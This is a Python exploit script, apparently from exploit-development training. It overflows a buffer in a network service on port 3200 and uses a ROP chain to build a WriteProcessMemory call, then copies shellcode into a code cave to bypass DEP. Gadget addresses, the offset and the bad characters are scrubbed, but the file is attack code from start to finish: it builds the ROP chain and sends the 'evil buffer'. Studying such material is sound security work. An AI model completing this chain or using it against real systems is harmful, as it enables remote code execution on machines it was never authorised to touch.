#!/usr/bin/python
import socket
import sys
from struct import pack
from shellcoding import shellcode_bytestring, ASSEMBLY


try:
    server = sys.argv[1]
    port = 3200
    size = 1500
    offset_size = 000 # scrubbed
    
    # semi_bad_chars = [scrubbed],these are converted to 0b on first occurence
    ### BAD CHARS ### 
    bad_chars = []
    
    command  = b"COMMAND MOVETEXT "
    command += b'' # scrubbed, semi bad char entries

    ### [ ] WRITEPROCESSMEMORY CALL SKELETON ###
    # skeleton WriteProcessMemory call
    wpm  = pack('<L', 0x61616161) # WriteProcessMemory address, placeholder ret
    wpm += pack('<L', 0x62626262) # code cave shellcode address, placeholder ret
    wpm += pack('<L', 0xffffffff) # hProcess (-1) arg
    wpm += pack('<L', 0x64646464) # lpBaseAddress (code cave shellcode) address, placeholder arg
    wpm += pack('<L', 0x65656565) # lpBuffer (stack shellcode) address, placeholder arg
    wpm += pack('<L', 0x66666666) # nSize, placeholder arg
    wpm += pack('<L', 0x67676767) # lpNumberOfBytes, placeholder arg
    ### [x] WRITEPROCESSMEMORY CALL SKELETON ###

    shellcode = shellcode_bytestring(ASSEMBLY)

    # offset length fills up space in offset_size not used by preceding semi_bad_chars, WPM skeleton, and shellcode
    offset = b'A' * ((offset_size - 4) - len(wpm) - len(shellcode))

    ### [ ] SAVE A POINTER TO THE WPM SKELETON ###
    # initial EIP control, start rop
    rop  = pack('<L', 0x00000000) # mov ebp, esp ; pop ecx ; ret  ;  
    rop += pack('<L', 0x41414141) # junk for pop
    rop += pack('<L', 0x00000000) # push ebp ; pop esi ; ret  ;  
    rop += pack('<L', 0x00000000) # pop eax ; ret  ;  
    rop += pack('<L', 0xfffffe4c) # -0x1b4, offset to WPM address placeholder 
    rop += pack('<L', 0x00000000) # mov ecx, esi ; add ecx, eax ; ret  ;   
    rop += pack('<L', 0x00000000) # mov eax, ecx ; ret  ;  
    rop += pack('<L', 0x00000000) # push ecx ; pop esi ; pop ebp ; retn 0x0018 ;  
    rop += pack('<L', 0x41414141) # junk for pop
    ### [X] SAVE A POINTER TO THE WPM SKELETON ###

    ### [ ] PATCH IN WPM RETURN ADDRESS ###
    # derference IAT pointer to WPM address
    rop += pack('<L', 0x00000000) # pop eax ; ret  ;  
    rop += pack('<L', 0x42424242) # junk for retn 0x0018
    rop += pack('<L', 0x42424242) # junk for retn 0x0018
    rop += pack('<L', 0x42424242) # junk for retn 0x0018
    rop += pack('<L', 0x42424242) # junk for retn 0x0018
    rop += pack('<L', 0x42424242) # junk for retn 0x0018
    rop += pack('<L', 0x42424242) # junk for retn 0x0018
    rop += pack('<L', 0x00000000) # IAT address of WPM (-8 due to upcoming eax+0x08)
    rop += pack('<L', 0x00000000) # mov eax, dword [eax+0x08] ; retn 0x0008 ;  
    # move WPM address into skeleton
    rop += pack('<L', 0x00000000) # mov ecx, esi ; ret  ;  
    rop += pack('<L', 0x42424242) # junk for retn 0x0008
    rop += pack('<L', 0x42424242) # junk for retn 0x0008
    rop += pack('<L', 0x00000000) # push ebp ; xchg dword [ecx], eax ; pop ebp ; ret  ;  
    ### [X] PATCH IN WPM RETURN ADDRESS ###

    ### [ ] PATCH IN SHELLCODE RETURN ADDRESS ###
    # increment ecx by 4
    rop += pack('<L', 0x00000000) # xor eax, eax ; inc eax ; ret  ;  
    rop += pack('<L', 0x00000000) # inc eax ; ret  ;  
    rop += pack('<L', 0x00000000) # inc eax ; ret  ;  
    rop += pack('<L', 0x00000000) # inc eax ; ret  ;  
    rop += pack('<L', 0x00000000) # add ecx, eax ; ret  ;  
    # move code cave address into skeleton
    rop += pack('<L', 0x00000000) # pop eax ; ret  ;  
    rop += pack('<L', 0x00000000) # code cave address
    rop += pack('<L', 0x00000000) # push ebp ; xchg dword [ecx], eax ; pop ebp ; ret  ;  
    ### [X] PATCH IN SHELLCODE RETURN ADDRESS ###

    ### [ ] PATCH IN LPBASEADDRESS ### 
    # increment ecx by 8
    rop += pack('<L', 0x00000000) # pop eax ; ret  ;  
    rop += pack('<L', 0x77777777) # first half of overflow to 8
    rop += pack('<L', 0x00000000) # add ecx, eax ; ret  ;  
    rop += pack('<L', 0x00000000) # pop eax ; ret  ;  
    rop += pack('<L', 0x88888891) # second half of overflow to 8
    rop += pack('<L', 0x00000000) # add ecx, eax ; ret  ;  
    # move code cave address into skeleton
    rop += pack('<L', 0x00000000) # pop eax ; ret  ;  
    rop += pack('<L', 0x00000000) # code cave address
    rop += pack('<L', 0x00000000) # push ebp ; xchg dword [ecx], eax ; pop ebp ; ret  ;  
    ### [X] PATCH IN LPBASEADDRESS ### 

    ### [ ] PATCH IN LPBUFFER ###
    # increment ecx by 4
    rop += pack('<L', 0x00000000) # xor eax, eax ; inc eax ; ret  ;  
    rop += pack('<L', 0x00000000) # inc eax ; ret  ;  
    rop += pack('<L', 0x00000000) # inc eax ; ret  ;  
    rop += pack('<L', 0x00000000) # inc eax ; ret  ;  
    rop += pack('<L', 0x00000000) # add ecx, eax ; ret  ;  
    # move stack shellcode address into skeleton
    rop += pack('<L', 0x00000000) # pop eax ; ret  ;  
    # ***** CHANGES WITH ROP CHAIN STRUCTURE ****
    rop += pack('<L', 0xfffffff3) # -0xd, stack shellcode offset (-1 and negated due to null, upcoming neg and dec)
    rop += pack('<L', 0x00000000) # neg eax ; dec eax ; pop ebp ; ret  ;  
    rop += pack('<L', 0x41414141) # junk for pop
    rop += pack('<L', 0x00000000) # add eax, ecx ; ret  ;   
    rop += pack('<L', 0x00000000) # push ebp ; xchg dword [ecx], eax ; pop ebp ; ret  ;  
    ### [X] PATCH IN LPBUFFER ###

    ### [ ] PATCH IN NSIZE ###
    # increment ecx by 4
    rop += pack('<L', 0x00000000) # xor eax, eax ; inc eax ; ret  ;  
    rop += pack('<L', 0x00000000) # inc eax ; ret  ;  
    rop += pack('<L', 0x00000000) # inc eax ; ret  ;  
    rop += pack('<L', 0x00000000) # inc eax ; ret  ;  
    rop += pack('<L', 0x00000000) # add ecx, eax ; ret  ;  
    # move 0x200 (len of shellcode to copy) into skeleton
    rop += pack('<L', 0x00000000) # pop eax ; ret  ;  
    rop += pack('<L', 0xfffffdff) # -0x201 (-1 and negated due to nulls, upcoming negate and dec)
    rop += pack('<L', 0x00000000) # neg eax ; dec eax ; pop ebp ; ret  ;  
    rop += pack('<L', 0x41414141) # junk for pop
    rop += pack('<L', 0x00000000) # push ebp ; xchg dword [ecx], eax ; pop ebp ; ret  ;  
    ### [X] PATCH IN NSIZE ###

    ### [ ] PATCH IN LPNUMBEROFBYTESWRITTEN ###
    # increment ecx by 4
    rop += pack('<L', 0x00000000) # xor eax, eax ; inc eax ; ret  ;  
    rop += pack('<L', 0x00000000) # inc eax ; ret  ;  
    rop += pack('<L', 0x00000000) # inc eax ; ret  ;  
    rop += pack('<L', 0x00000000) # inc eax ; ret  ;  
    rop += pack('<L', 0x00000000) # add ecx, eax ; ret  ;  
    # move stack shellcode address into skeleton
    rop += pack('<L', 0x00000000) # pop eax ; ret  ;  
    rop += pack('<L', 0x00000000) # data cave address
    rop += pack('<L', 0x00000000) # push ebp ; xchg dword [ecx], eax ; pop ebp ; ret  ;  
    ### [X] PATCH IN LPNUMBEROFBYTESWRITTEN ###

    ### [ ] RETURN INTO WRITEPROCESSMEMORY CALL ### 
    # decrement ecx up to WPM return address
    rop += pack('<L', 0x00000000) # pop eax ; ret  ;  
    rop += pack('<L', 0xffffffe8) # -0x18, offset to WPM return address
    rop += pack('<L', 0x00000000) # add ecx, eax ; ret  ;  
    # move WPM return address into esp
    rop += pack('<L', 0x00000000) # mov eax, ecx ; ret  ;  
    rop += pack('<L', 0x00000000) # mov esp, eax ; ret  ;  
    ### [X] RETURN INTO WRITEPROCESSMEMORY CALL ### 



    # shellcode placeholder
    end_offset = b'D' * 70

    end = b'\r\n'

    buffer = wpm + shellcode + offset + rop + end_offset + end
    print("[+] Scanning shellcode buffer...")
    print("[+] Scanning entire buffer...")
    buffer = command + buffer

    input("[?] Press Enter to exploit...")
    print("[+] Sending evil buffer...")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((server, port))
    s.send(buffer)
    s.close()
  
    print("[+] Done!")
  
except socket.error:
    print("[!] Could not connect!")
